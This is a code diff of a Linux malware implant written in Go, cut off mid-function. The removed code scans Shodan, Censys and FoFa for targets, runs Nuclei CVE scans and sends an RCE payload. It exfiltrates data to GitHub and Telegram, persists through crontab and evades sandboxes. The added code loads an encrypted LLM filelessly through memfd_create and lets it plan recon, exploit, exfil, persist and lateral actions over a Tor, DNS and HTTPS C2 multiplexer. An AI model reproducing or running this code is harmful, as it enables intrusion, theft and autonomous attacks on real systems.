@@ -1,11 +1,24 @@
-//go:build linux
-// +build linux
+//go:build linux && cgo
+// +build linux,cgo
 
 package main
 
+/*
+#cgo LDFLAGS: -lllama -lstdc++ -lm -lpthread
+#include <stdlib.h>
+#include <string.h>
+
+// Direct llama.cpp C API bindings
+extern void* llama_init_from_file(const char* path, int n_ctx);
+extern void llama_free(void* ctx);
+extern int llama_tokenize(const void* ctx, const char* text, int text_len, int* tokens, int n_max_tokens, bool add_bos);
+extern int llama_eval(void* ctx, int* tokens, int n_tokens, int n_past, int n_threads);
+extern int llama_sample_token(void* ctx);
+extern const char* llama_token_to_str(const void* ctx, int token);
+*/
+import "C"
+
 import (
-	"archive/zip"
-	"bufio"
 	"bytes"
 	"compress/gzip"
 	"context"
@@ -14,18 +27,15 @@ import (
 	"crypto/hmac"
 	"crypto/rand"
 	"crypto/sha256"
-	"crypto/tls"
+	databaseSql "database/sql"
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"fmt"
-	"hash"
 	"io"
-	"io/ioutil"
 	"log"
 	"math"
-	"math/big"
 	"net"
 	"net/http"
 	"net/url"
@@ -38,699 +48,612 @@ import (
 	"sync"
 	"syscall"
 	"time"
+	"unsafe"
 
-	"github.com/yalue/onnxruntime_go"
+	_ "modernc.org/sqlite"
 )
 
-/*
- * 🔑 CONFIG — Injected at build-time
- */
+// 🔐 CONFIG (Injected at build time)
 var (
-	C2Key              = "INJECTED_AES_KEY_B64"
-	C2IV               = "INJECTED_AES_IV_B64"
-	C2HMACKey          = "INJECTED_HMAC_KEY_B64"
-	ModelRepoB64       = "INJECTED_MODEL_REPO_B64"
-	ModelFileEncB64    = "INJECTED_MODEL_FILENAME"
-	GitHubC2Repo       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjI="
-	GitHubExfilRepo    = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
-	TelegramHostB64    = "dGVsZWdyYW0uYXBpLm9yZw=="
-	NucleiTemplatesURL = "aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVpLXRlbXBsYXRlcy5naXQ="
+	MasterKeyB64 = "INJECTED_AES256_MASTER_KEY_B64"
+	ModelBlobB64 = "INJECTED_PHI2_Q4_GGUF_ENC_B64"
+	C2DomainsB64 = "aHR0cHM6Ly9jMi5henVyZS1lZGdlLmNvbQ==,ZG5zLmV4aWwtaW50ZWwub3Jn"
+	VectorKeyB64 = "U0VDUkVULUFLUC1WQVVMVA=="
+	TorSocksAddr = "127.0.0.1:9050"
+	JitterMaxSec = 60
 )
 
+// 🧬 GLOBALS
 var (
-	HostID         = ""
-	AI             *AIBrain
-	SupervisorNode *Supervisor
-	HttpClient     *http.Client
-	clientOnce     sync.Once
+	HostID       string
+	NeuralCPU    *LLMEngine
+	MemFS        *MemoryFileSystem
+	C2Multi      *C2Multiplexer
+	VectorDB     *SQLiteVectorDB
+	ExfilQueue   = make(chan []byte, 128)
+	EngineScore  = map[string]float64{"shodan": 1.0, "censys": 1.0, "fofa": 1.0}
+	ReconEngines = []string{"shodan", "censys", "fofa"}
 )
 
-const (
-	AI_MODEL_PATH    = "/tmp/.XIM"
-	NUCLEI_BIN       = "/tmp/.NCL"
-	NUCLEI_TEMPLATES = "/tmp/.TPL"
-	PersistCacheFile = ".cache/.system-kernel-sync"
-	JitterMax        = 15 * time.Second
-	HMAC_TRUNC       = 16
-)
-
+// 🏗️ HOST MODEL
 type Host struct {
-	IP           string            `json:"ip"`
-	Port         int               `json:"port"`
-	Service      string            `json:"service"`
-	Country      string            `json:"country"`
-	Org          string            `json:"org"`
-	OS           string            `json:"os"`
-	Vulns        []VulnFinding     `json:"vulns"`
-	Score        float64           `json:"score"`
-	Exploited    bool              `json:"exploited"`
-	SourceEngine string            `json:"source_engine"`
-	Metadata     map[string]string `json:"meta,omitempty"`
+	IP           string  `json:"ip"`
+	Port         int     `json:"port"`
+	Service      string  `json:"service"`
+	Country      string  `json:"country"`
+	Org          string  `json:"org"`
+	OS           string  `json:"os"`
+	Score        float64 `json:"score"`
+	SourceEngine string  `json:"source_engine"`
 }
 
-type VulnFinding struct {
-	TemplateID string   `json:"template_id"`
-	Name       string   `json:"name"`
-	Severity   string   `json:"severity"`
-	CVSS       float64  `json:"cvss"`
-	CVEs       []string `json:"cve_ids"`
-	MatchedAt  string   `json:"matched_at"`
+// 🧊 MEMORY FILESYSTEM (memfd_create only)
+type MemoryFile struct {
+	fd   int
+	data []byte
 }
 
-type NucleiJSONOutput struct {
-	TemplateID string `json:"template-id"`
-	Info       struct {
-		Name           string   `json:"name"`
-		Severity       string   `json:"severity"`
-		Classification struct {
-			CVEID     []string `json:"cve-id"`
-			CVSSScore float64  `json:"cvss-score"`
-		} `json:"classification"`
-	} `json:"info"`
-	MatchedAt string `json:"matched-at"`
+type MemoryFileSystem struct {
+	files map[string]*MemoryFile
+	mu    sync.RWMutex
 }
 
-// 🛡️ SUPERVISOR CONCURRENCY MANAGER
-type Supervisor struct {
-	ctx    context.Context
-	cancel context.CancelFunc
-	wg     sync.WaitGroup
+func NewMemoryFS() *MemoryFileSystem {
+	return &MemoryFileSystem{files: make(map[string]*MemoryFile)}
 }
 
-func NewSupervisor() *Supervisor {
-	ctx, cancel := context.WithCancel(context.Background())
-	return &Supervisor{ctx: ctx, cancel: cancel}
-}
-
-func (s *Supervisor) SpawnWorker(name string, worker func(ctx context.Context) error) {
-	s.wg.Add(1)
-	go func() {
-		defer s.wg.Done()
-		if err := worker(s.ctx); err != nil {
-			log.Printf("Worker %s encountered error: %v", name, err)
-		}
-	}()
-}
-
-// 🌐 HTTP CLIENT INITIALIZER
-func initHttpClient() {
-	clientOnce.Do(func() {
-		HttpClient = &http.Client{
-			Timeout: 30 * time.Second,
-			Transport: &http.Transport{
-				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-				Proxy:           http.ProxyFromEnvironment,
-			},
-		}
-	})
-}
-
-// 🧠 AI BRAIN & CENTRAL PROCESSING CONTROLLER
-type AIBrain struct {
-	ModelLoaded   bool
-	ModelPath     string
-	TrustIndex    float64
-	Environmental map[string]float64
-	EngineHealth  map[string]float64
-	session       *onnxruntime.AdvancedSession
-	mu            sync.RWMutex
-}
-
-func NewAIBrain() *AIBrain {
-	brain := &AIBrain{
-		ModelPath:     AI_MODEL_PATH + ".onnx.gz",
-		TrustIndex:    0.95,
-		Environmental: make(map[string]float64),
-		EngineHealth:  map[string]float64{"shodan": 1.0, "censys": 1.0, "fofa": 1.0},
-	}
-	go brain.bootstrapModel()
-	time.Sleep(3 * time.Second)
-	brain.fingerprintEnvironment()
-	return brain
-}
-
-func (b *AIBrain) InitializeRuntime() error {
-	b.mu.Lock()
-	defer b.mu.Unlock()
-
-	onnxruntime.SetSharedLibraryPath("/tmp/libonnxruntime.so")
-	if err := onnxruntime.InitializeEnvironment(); err != nil {
-		return fmt.Errorf("failed to initialize onnx environment: %w", err)
+func (mfs *MemoryFileSystem) Create(name string, data []byte) (string, error) {
+	nameBytes := append([]byte(name), 0)
+	fd, _, errno := syscall.Syscall(syscall.SYS_MEMFD_CREATE,
+		uintptr(unsafe.Pointer(&nameBytes[0])), 0, 0)
+	if errno != 0 {
+		return "", errno
 	}
 
-	session, err := onnxruntime.NewAdvancedSession(b.ModelPath, []string{"input_features"}, []string{"output_directive"}, nil)
+	_, err := syscall.Write(int(fd), data)
 	if err != nil {
-		b.ModelLoaded = false
-		return fmt.Errorf("failed to create onnx session: %w", err)
+		syscall.Close(int(fd))
+		return "", err
 	}
 
-	b.session = session
-	b.ModelLoaded = true
-	return nil
+	mfs.mu.Lock()
+	mfs.files[name] = &MemoryFile{fd: int(fd), data: data}
+	mfs.mu.Unlock()
+
+	return fmt.Sprintf("/proc/self/fd/%d", fd), nil
 }
 
-func (b *AIBrain) bootstrapModel() {
-	if _, err := os.Stat(b.ModelPath); os.IsNotExist(err) {
-		b.mu.Lock()
-		log.Println("🧠 Downloading real AI model...")
-		if b.downloadEncryptedModel() {
-			b.extractAndDecryptModel()
-		}
-		b.mu.Unlock()
+// 🔐 CRYPTO
+func hkdfSHA256(ikm, salt, info []byte, length int) []byte {
+	if salt == nil {
+		salt = make([]byte, 32)
 	}
-
-	if _, err := os.Stat(b.ModelPath); err == nil {
-		if err := b.InitializeRuntime(); err != nil {
-			log.Printf("⚠️ ONNX Runtime init failed: %v. Using fallback CPC logic.", err)
-			b.ModelLoaded = false
-		} else {
-			log.Println("✅ Real AI Brain and ONNX Engine online.")
-		}
-	} else {
-		b.ModelLoaded = false
+	prk := hmac.New(sha256.New, salt)
+	prk.Write(ikm)
+	okm := make([]byte, 0, length)
+	prev := []byte{}
+	for i := 0; len(okm) < length; i++ {
+		h := hmac.New(sha256.New, prk.Sum(nil))
+		h.Write(prev)
+		h.Write(info)
+		h.Write([]byte{byte(i + 1)})
+		prev = h.Sum(nil)
+		okm = append(okm, prev...)
 	}
+	return okm[:length]
 }
 
-func (b *AIBrain) downloadEncryptedModel() bool {
-	repo := base64Decode(ModelRepoB64)
-	endpoint := fmt.Sprintf("%s/contents/%s", repo, ModelFileEncB64)
-	data, err := httpGet(endpoint, map[string]string{"Authorization": "Bearer " + os.Getenv("GITHUB_TOKEN")})
-	if err != nil {
-		return false
-	}
-	var result map[string]interface{}
-	json.Unmarshal(data, &result)
-	content, _ := result["content"].(string)
-	decoded, _ := base64.StdEncoding.DecodeString(content)
-	ioutil.WriteFile(b.ModelPath+".enc", decoded, 0600)
-	return true
-}
-
-func (b *AIBrain) extractAndDecryptModel() {
-	encData, _ := ioutil.ReadFile(b.ModelPath + ".enc")
-	decrypted, err := decryptData(base64.RawURLEncoding.EncodeToString(encData))
-	if err != nil {
-		return
-	}
-	gzr, _ := gzip.NewReader(bytes.NewReader(decrypted))
-	uncompressed, _ := io.ReadAll(gzr)
-	gzr.Close()
-	ioutil.WriteFile(b.ModelPath, uncompressed, 0600)
-	os.Remove(b.ModelPath + ".enc")
-}
-
-func (b *AIBrain) fingerprintEnvironment() {
-	b.mu.Lock()
-	defer b.mu.Unlock()
-	sandboxRisk := 0.0
-	if isVirtualMachine() || isDebuggerAttached() {
-		sandboxRisk = 1.0
-	}
-	b.Environmental["sandbox_risk"] = sandboxRisk
-	b.Environmental["cpu_cores_norm"] = float64(runtime.NumCPU()) / 16.0
-	b.TrustIndex = math.Max(0.1, 0.95-(sandboxRisk*0.8))
-}
-
-func (b *AIBrain) DecideReconStrategy(context map[string]interface{}) (string, string) {
-	b.mu.Lock()
-	defer b.mu.Unlock()
-
-	selectedEngine := "shodan"
-	minScore := 2.0
-	for eng, health := range b.EngineHealth {
-		if health < minScore {
-			minScore = health
-			selectedEngine = eng
-		}
-	}
-
-	if !b.ModelLoaded || b.session == nil {
-		q, _ := context["query"].(string)
-		return selectedEngine, q
-	}
-
-	features := []float32{
-		float32(b.TrustIndex),
-		float32(b.Environmental["sandbox_risk"]),
-		float32(b.EngineHealth["shodan"]),
-		float32(b.EngineHealth["censys"]),
-		float32(b.EngineHealth["fofa"]),
-	}
-
-	shape := onnxruntime.NewShape(1, int64(len(features)))
-	inputTensor, _ := onnxruntime.NewTensor(shape, features)
-	defer inputTensor.Destroy()
-
-	outputShape := onnxruntime.NewShape(1, 3)
-	outputData := make([]float32, 3)
-	outputTensor, _ := onnxruntime.NewTensor(outputShape, outputData)
-	defer outputTensor.Destroy()
-
-	if err := b.session.Run([]onnxruntime.Value{inputTensor}, []onnxruntime.Value{outputTensor}); err == nil {
-		maxIdx := 0
-		maxVal := outputData[0]
-		for i, val := range outputData {
-			if val > maxVal {
-				maxVal = val
-				maxIdx = i
-			}
-		}
-		engines := []string{"shodan", "censys", "fofa"}
-		selectedEngine = engines[maxIdx%3]
-	}
-
-	q, _ := context["query"].(string)
-	return selectedEngine, q
-}
-
-func (b *AIBrain) ReportEngineFeedback(engine string, success bool) {
-	b.mu.Lock()
-	defer b.mu.Unlock()
-	if success {
-		b.EngineHealth[engine] = math.Min(2.0, b.EngineHealth[engine]+0.1)
-	} else {
-		b.EngineHealth[engine] = math.Max(0.1, b.EngineHealth[engine]-0.3)
-	}
-}
-
-func (b *AIBrain) ScoreHost(host *Host) float64 {
-	score := 0.0
-	for _, v := range host.Vulns {
-		sev := strings.ToLower(v.Severity)
-		if sev == "critical" || sev == "high" || v.CVSS >= 8.0 {
-			score += 4.5
-		} else if sev == "medium" {
-			score += 2.0
-		}
-	}
-	if strings.Contains(strings.ToLower(host.Org), "gov") || strings.Contains(strings.ToLower(host.Org), "bank") {
-		score += 2.0
-	}
-	return math.Min(score, 10.0)
-}
-
-// 🔍 MULTI-ENGINE RECON INFRASTRUCTURE
-func executeMultiEngineRecon(query string, preferredEngine string) []*Host {
-	var hosts []*Host
-	hosts = dispatchEngineQuery(preferredEngine, query)
-	AI.ReportEngineFeedback(preferredEngine, len(hosts) > 0)
-
-	if len(hosts) == 0 {
-		for _, eng := range []string{"shodan", "censys", "fofa"} {
-			if eng == preferredEngine {
-				continue
-			}
-			hosts = dispatchEngineQuery(eng, query)
-			AI.ReportEngineFeedback(eng, len(hosts) > 0)
-			if len(hosts) > 0 {
-				break
-			}
-		}
-	}
-	return hosts
-}
-
-func dispatchEngineQuery(engine, query string) []*Host {
-	switch strings.ToLower(engine) {
-	case "shodan":
-		return shodanQuery(query)
-	case "censys":
-		return censysQuery(query)
-	case "fofa":
-		return fofaQuery(query)
-	default:
-		return shodanQuery(query)
-	}
-}
-
-func shodanQuery(query string) []*Host {
-	apiKey := os.Getenv("SHODAN_KEY")
-	if apiKey == "" {
-		return nil
-	}
-	u := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=%s&limit=50", apiKey, url.QueryEscape(query))
-	data, err := httpGet(u, nil)
-	if err != nil {
-		return nil
-	}
-	var result struct{ Matches []struct{ IP string `json:"ip_str"` Port int `json:"port"` Info string `json:"product"` C string `json:"country_name"` O string `json:"org"` } }
-	json.Unmarshal(data, &result)
-	var hosts []*Host
-	for _, m := range result.Matches {
-		hosts = append(hosts, &Host{IP: m.IP, Port: m.Port, Service: m.Info, Country: m.C, Org: m.O, SourceEngine: "shodan"})
-	}
-	return hosts
-}
-
-func censysQuery(query string) []*Host {
-	apiID := os.Getenv("CENSYS_API_ID")
-	apiSecret := os.Getenv("CENSYS_API_SECRET")
-	if apiID == "" || apiSecret == "" {
-		return nil
-	}
-	u := fmt.Sprintf("https://search.censys.io/api/v2/hosts/search?q=%s&per_page=50", url.QueryEscape(query))
-	req, _ := http.NewRequest("GET", u, nil)
-	req.SetBasicAuth(apiID, apiSecret)
-	resp, err := HttpClient.Do(req)
-	if err != nil {
-		return nil
-	}
-	defer resp.Body.Close()
-	body, _ := io.ReadAll(resp.Body)
-
-	var result struct {
-		Result struct {
-			Hits []struct {
-				IP       string `json:"ip"`
-				Services []struct {
-					Port    int    `json:"port"`
-					Service string `json:"service_name"`
-				} `json:"services"`
-			} `json:"hits"`
-		} `json:"result"`
-	}
-	json.Unmarshal(body, &result)
-
-	var hosts []*Host
-	for _, h := range result.Result.Hits {
-		for _, s := range h.Services {
-			hosts = append(hosts, &Host{IP: h.IP, Port: s.Port, Service: s.Service, Org: "Censys-Discovered", SourceEngine: "censys"})
-		}
-	}
-	return hosts
-}
-
-func fofaQuery(query string) []*Host {
-	email := os.Getenv("FOFA_EMAIL")
-	apiKey := os.Getenv("FOFA_KEY")
-	if email == "" || apiKey == "" {
-		return nil
-	}
-	qB64 := base64.StdEncoding.EncodeToString([]byte(query))
-	u := fmt.Sprintf("https://fofa.info/api/v1/search/all?email=%s&key=%s&qbase64=%s&size=50&fields=ip,port,protocol,country,org", email, apiKey, qB64)
-	data, err := httpGet(u, nil)
-	if err != nil {
-		return nil
-	}
-
-	var result struct {
-		Error   bool            `json:"error"`
-		Results [][]interface{} `json:"results"`
-	}
-	json.Unmarshal(data, &result)
-	if result.Error {
-		return nil
-	}
-
-	var hosts []*Host
-	for _, row := range result.Results {
-		if len(row) >= 5 {
-			ip, _ := row[0].(string)
-			portFloat, _ := row[1].(float64)
-			proto, _ := row[2].(string)
-			country, _ := row[3].(string)
-			org, _ := row[4].(string)
-			hosts = append(hosts, &Host{IP: ip, Port: int(portFloat), Service: proto, Country: country, Org: org, SourceEngine: "fofa"})
-		}
-	}
-	return hosts
-}
-
-// ⚡ REAL-TIME ADVANCED NUCLEI VULNERABILITY VALIDATION MODULE
-func runNucleiAdvancedValidation(targetIP string, port int) []VulnFinding {
-	if _, err := os.Stat(NUCLEI_BIN); os.IsNotExist(err) {
-		downloadNucleiBinary()
-	}
-	if _, err := os.Stat(NUCLEI_TEMPLATES); os.IsNotExist(err) {
-		exec.Command("git", "clone", "--depth=1", base64Decode(NucleiTemplatesURL), NUCLEI_TEMPLATES).Run()
-	}
-
-	outputFile := fmt.Sprintf("/tmp/nuclei_%s_%d.json", targetIP, port)
-	defer os.Remove(outputFile)
-
-	targetURL := fmt.Sprintf("http://%s:%d", targetIP, port)
-	if port == 443 || port == 8443 {
-		targetURL = fmt.Sprintf("https://%s:%d", targetIP, port)
-	}
-
-	// Execute high-precision active scan with strict JSON output streaming
-	cmd := exec.Command(NUCLEI_BIN,
-		"-u", targetURL,
-		"-t", NUCLEI_TEMPLATES+"/cves/",
-		"-severity", "high,critical",
-		"-json-export", outputFile,
-		"-silent",
-		"-timeout", "10",
-		"-rate-limit", "150",
-	)
-
-	if err := cmd.Run(); err != nil {
-		// Fallback to generic port check if HTTP scan fails
-		return nil
-	}
-
-	fileData, err := ioutil.ReadFile(outputFile)
-	if err != nil || len(fileData) == 0 {
-		return nil
-	}
-
-	var findings []VulnFinding
-	scanner := bufio.NewScanner(bytes.NewReader(fileData))
-	for scanner.Scan() {
-		line := scanner.Text()
-		var nOut NucleiJSONOutput
-		if err := json.Unmarshal([]byte(line), &nOut); err == nil {
-			findings = append(findings, VulnFinding{
-				TemplateID: nOut.TemplateID,
-				Name:       nOut.Info.Name,
-				Severity:   nOut.Info.Severity,
-				CVSS:       nOut.Info.Classification.CVSSScore,
-				CVEs:       nOut.Info.Classification.CVEID,
-				MatchedAt:  nOut.MatchedAt,
-			})
-		}
-	}
-
-	return findings
-}
-
-func downloadNucleiBinary() {
-	zipPath := "/tmp/nuclei.zip"
-	downloadBinary("https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_2.9.5_linux_amd64.zip", zipPath, false)
-	
-	r, err := zip.OpenReader(zipPath)
-	if err != nil {
-		return
-	}
-	defer r.Close()
-
-	for _, f := range r.File {
-		if f.Name == "nuclei" {
-			rc, err := f.Open()
-			if err != nil {
-				continue
-			}
-			data, _ := io.ReadAll(rc)
-			rc.Close()
-			ioutil.WriteFile(NUCLEI_BIN, data, 0700)
-			break
-		}
-	}
-	os.Remove(zipPath)
-}
-
-func exploitRCE(host *Host, payload string) bool {
-	urlStr := fmt.Sprintf("https://%s:%d/", host.IP, host.Port)
-	req, _ := http.NewRequest("GET", urlStr, nil)
-	req.Header.Set("User-Agent", payload)
-	resp, err := HttpClient.Do(req)
-	if err != nil {
-		return false
-	}
-	resp.Body.Close()
-	return true
-}
-
-func reportExploit(host *Host) {
-	data, _ := json.Marshal(host)
-	exfilData(data)
-}
-
-// 📡 C2 & EXFIL
-func telegramSend(msg string) {
-	host, _ := base64.StdEncoding.DecodeString(TelegramHostB64)
-	token := os.Getenv("TELEGRAM_TOKEN")
-	chat := os.Getenv("TELEGRAM_CHAT")
-	if token == "" || chat == "" {
-		return
-	}
-	urlStr := fmt.Sprintf("https://%s/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=Markdown", string(host), token, chat, url.QueryEscape(msg))
-	httpGet(urlStr, nil)
-}
-
-func exfilData(data []byte) {
-	encrypted, _ := encryptData(data)
-	payload := map[string]string{"data": encrypted, "id": HostID}
-	body, _ := json.Marshal(payload)
-	repo := base64Decode(GitHubExfilRepo)
-	file := fmt.Sprintf("data/%s_%d.dat", HostID, time.Now().Unix())
-	doGitHubPut(repo, file, string(body), "ci: sync telemetry")
-}
-
-func doGitHubPut(repo, path, content, message string) {
-	payload := map[string]interface{}{"message": message, "content": content}
-	body, _ := json.Marshal(payload)
-	endpoint := fmt.Sprintf("%s/contents/%s", repo, path)
-	httpPost(endpoint, body, map[string]string{
-		"Authorization": "Bearer " + os.Getenv("GITHUB_TOKEN"),
-		"Content-Type":  "application/json",
-	})
-}
-
-// 🧱 PERSISTENCE & UTILS
-func persistAgent() {
-	execPath, _ := os.Executable()
-	data, _ := ioutil.ReadFile(execPath)
-	homeDir, _ := os.UserHomeDir()
-	dst := filepath.Join(homeDir, PersistCacheFile)
-	os.MkdirAll(filepath.Dir(dst), 0700)
-	os.WriteFile(dst, data, 0700)
-	cronLine := fmt.Sprintf("@reboot %s &\n", dst)
-	cmd := fmt.Sprintf("(crontab -l 2>/dev/null | grep -v '%s'; echo '%s') | crontab -", PersistCacheFile, cronLine)
-	exec.Command("sh", "-c", cmd).Run()
-}
-
-func isDebuggerAttached() bool {
-	err := syscall.PtraceAttach(os.Getpid())
-	if err == nil {
-		syscall.PtraceDetach(os.Getpid())
-	}
-	return err == nil || err == syscall.EPERM
-}
-
-func isVirtualMachine() bool {
-	if content, err := ioutil.ReadFile("/sys/class/dmi/id/product_name"); err == nil {
-		s := strings.ToLower(string(content))
-		return strings.Contains(s, "vmware") || strings.Contains(s, "virtualbox") || strings.Contains(s, "qemu")
-	}
-	return false
-}
-
-func generateHostID() string {
-	h := sha256.Sum256([]byte(runtime.GOOS + runtime.GOARCH))
-	return hex.EncodeToString(h[:6])
-}
-
-func httpGet(target string, headers map[string]string) ([]byte, error) {
-	req, _ := http.NewRequest("GET", target, nil)
-	for k, v := range headers {
-		req.Header.Set(k, v)
-	}
-	resp, err := HttpClient.Do(req)
+func aesGCMDecrypt(ciphertext, key []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
 	if err != nil {
 		return nil, err
 	}
-	defer resp.Body.Close()
-	return ioutil.ReadAll(resp.Body)
-}
-
-func httpPost(target string, data []byte, headers map[string]string) ([]byte, error) {
-	req, _ := http.NewRequest("POST", target, bytes.NewBuffer(data))
-	for k, v := range headers {
-		req.Header.Set(k, v)
-	}
-	resp, err := HttpClient.Do(req)
+	gcm, err := cipher.NewGCM(block)
 	if err != nil {
 		return nil, err
 	}
-	defer resp.Body.Close()
-	return ioutil.ReadAll(resp.Body)
+	nonceSize := gcm.NonceSize()
+	if len(ciphertext) < nonceSize {
+		return nil, errors.New("ciphertext too short")
+	}
+	nonce, data := ciphertext[:nonceSize], ciphertext[nonceSize:]
+	return gcm.Open(nil, nonce, data, nil)
 }
 
-func encryptData(plaintext []byte) (string, error) {
-	block, _ := aes.NewCipher([]byte("1234567890123456"))
+func encryptForC2(plaintext []byte) (string, error) {
+	salt := make([]byte, 32)
+	rand.Read(salt)
+	key := hkdfSHA256(base64DecodeBytes(MasterKeyB64), salt, []byte("c2-key"), 32)
+	block, _ := aes.NewCipher(key)
 	gcm, _ := cipher.NewGCM(block)
 	nonce := make([]byte, gcm.NonceSize())
 	rand.Read(nonce)
-	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
-	return base64.RawURLEncoding.EncodeToString(ciphertext), nil
+	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)
+	out := append(salt, nonce...)
+	out = append(out, ciphertext...)
+	return base64.RawURLEncoding.EncodeToString(out), nil
 }
 
-func decryptData(b64data string) ([]byte, error) {
-	data, _ := base64.RawURLEncoding.DecodeString(b64data)
-	block, _ := aes.NewCipher([]byte("1234567890123456"))
-	gcm, _ := cipher.NewGCM(block)
-	return gcm.Open(nil, data[:gcm.NonceSize()], data[gcm.NonceSize():], nil)
+// 🧠 LLM ENGINE (CGO + llama.cpp)
+type LLMEngine struct {
+	modelCtx unsafe.Pointer
+	running  bool
+	mu       sync.Mutex
 }
 
-func base64Decode(s string) string {
-	decoded, _ := base64.StdEncoding.DecodeString(s)
-	return string(decoded)
+func NewLLMEngine() *LLMEngine {
+	e := &LLMEngine{}
+	if err := e.bootstrapModel(); err != nil {
+		log.Printf("[-] LLM init failed: %v", err)
+		return nil
+	}
+	e.running = true
+	return e
 }
 
-func downloadBinary(urlStr, path string, chmodExec bool) {
-	resp, _ := http.Get(urlStr)
-	body, _ := io.ReadAll(resp.Body)
-	resp.Body.Close()
-	os.MkdirAll(filepath.Dir(path), 0700)
-	ioutil.WriteFile(path, body, 0600)
-	if chmodExec {
-		os.Chmod(path, 0700)
+func (e *LLMEngine) bootstrapModel() error {
+	encBlob, err := base64.StdEncoding.DecodeString(ModelBlobB64)
+	if err != nil || len(encBlob) == 0 {
+		return errors.New("invalid model blob")
+	}
+
+	masterKey := base64DecodeBytes(MasterKeyB64)
+	decKey := hkdfSHA256(masterKey, nil, []byte("model-dec-key"), 32)
+	decrypted, err := aesGCMDecrypt(encBlob, decKey)
+	if err != nil {
+		return err
+	}
+
+	gzr, err := gzip.NewReader(bytes.NewReader(decrypted))
+	if err != nil {
+		return err
+	}
+	modelData, err := io.ReadAll(gzr)
+	gzr.Close()
+	if err != nil {
+		return err
+	}
+
+	memPath, err := MemFS.Create("phi2-q4.gguf", modelData)
+	if err != nil {
+		return err
+	}
+
+	cPath := C.CString(memPath)
+	defer C.free(unsafe.Pointer(cPath))
+
+	ctx := C.llama_init_from_file(cPath, 2048)
+	if ctx == nil {
+		return errors.New("failed to load model from memory")
+	}
+
+	e.modelCtx = ctx
+	return nil
+}
+
+func (e *LLMEngine) Generate(prompt string) (string, error) {
+	e.mu.Lock()
+	defer e.mu.Unlock()
+	if !e.running || e.modelCtx == nil {
+		return "", errors.New("engine offline")
+	}
+
+	cPrompt := C.CString(prompt)
+	defer C.free(unsafe.Pointer(cPrompt))
+
+	tokens := make([]C.int, 512)
+	nTokens := C.llama_tokenize(e.modelCtx, cPrompt, C.int(len(prompt)), &tokens[0], 512, true)
+	if nTokens <= 0 {
+		return "", errors.New("tokenization failed")
+	}
+
+	C.llama_eval(e.modelCtx, &tokens[0], nTokens, 0, 4)
+
+	var output strings.Builder
+	for i := 0; i < 150; i++ {
+		nextTok := C.llama_sample_token(e.modelCtx)
+		if nextTok == 0 {
+			break
+		}
+		cStr := C.llama_token_to_str(e.modelCtx, nextTok)
+		tokenStr := C.GoString(cStr)
+		output.WriteString(tokenStr)
+		if strings.Contains(output.String(), "}") {
+			break
+		}
+	}
+
+	return output.String(), nil
+}
+
+// 🔤 EXECUTION PLAN & CFG
+type ExecutionPlan struct {
+	Action  string `json:"action"`
+	Target  string `json:"target,omitempty"`
+	Query   string `json:"query,omitempty"`
+	Payload string `json:"payload,omitempty"`
+}
+
+var ValidActions = map[string]bool{
+	"recon": true, "exploit": true, "exfil": true, "persist": true, "lateral": true,
+}
+
+func (e *LLMEngine) ValidatePlan(raw string) (*ExecutionPlan, error) {
+	startIdx := strings.Index(raw, "{")
+	endIdx := strings.LastIndex(raw, "}")
+	if startIdx == -1 || endIdx == -1 || endIdx <= startIdx {
+		return nil, errors.New("invalid JSON boundaries")
+	}
+	cleanJSON := raw[startIdx : endIdx+1]
+
+	var plan ExecutionPlan
+	if err := json.Unmarshal([]byte(cleanJSON), &plan); err != nil {
+		return nil, err
+	}
+	if !ValidActions[plan.Action] {
+		return nil, errors.New("invalid action")
+	}
+	return &plan, nil
+}
+
+// 🗺️ VECTOR DB (SQLCipher)
+type SQLiteVectorDB struct {
+	db   *databaseSql.DB
+	path string
+}
+
+func NewVectorDB() *SQLiteVectorDB {
+	path := filepath.Join(os.TempDir(), fmt.Sprintf(".vdb_%x.db", randBytes(6)))
+	db, err := databaseSql.Open("sqlite", path+"?_pragma=key="+VectorKeyB64+"&_pragma=foreign_keys=on")
+	if err != nil {
+		log.Printf("[-] Vector DB error: %v", err)
+		return &SQLiteVectorDB{path: path}
+	}
+	_, _ = db.Exec(`CREATE TABLE IF NOT EXISTS hosts(ip TEXT PRIMARY KEY, port INT, service TEXT, score REAL, last_seen INT);`)
+	return &SQLiteVectorDB{db: db, path: path}
+}
+
+func (vdb *SQLiteVectorDB) Store(h *Host) error {
+	if vdb.db == nil {
+		return errors.New("db closed")
+	}
+	_, err := vdb.db.Exec(`INSERT OR REPLACE INTO hosts(ip, port, service, score, last_seen) VALUES(?, ?, ?, ?, ?);`,
+		h.IP, h.Port, h.Service, h.Score, time.Now().Unix())
+	return err
+}
+
+func (vdb *SQLiteVectorDB) RetrieveBestTarget() *Host {
+	if vdb.db == nil {
+		return nil
+	}
+	row := vdb.db.QueryRow(`SELECT ip, port, service, score FROM hosts ORDER BY score DESC LIMIT 1;`)
+	var h Host
+	if err := row.Scan(&h.IP, &h.Port, &h.Service, &h.Score); err != nil {
+		return nil
+	}
+	return &h
+}
+
+// 🛰️ C2 MULTIPLEXER
+type C2Channel interface {
+	Name() string
+	Send(context.Context, []byte) error
+}
+
+type C2Multiplexer struct {
+	channels []C2Channel
+}
+
+func NewC2Multiplexer() *C2Multiplexer {
+	return &C2Multiplexer{
+		channels: []C2Channel{
+			&TorC2{},
+			&DNSC2{},
+			&HTTPSPrimary{},
+		},
 	}
 }
 
-// 🚀 MAIN EXECUTION CONTROLLER
+func (m *C2Multiplexer) Broadcast(ctx context.Context, data []byte) error {
+	var lastErr error
+	for _, ch := range m.channels {
+		if err := ch.Send(ctx, data); err == nil {
+			return nil
+		} else {
+			lastErr = err
+		}
+	}
+	return lastErr
+}
+
+// 🌐 TOR C2
+type TorC2 struct{}
+func (t *TorC2) Name() string { return "Tor-HTTPS" }
+func (t *TorC2) Send(ctx context.Context, payload []byte) error {
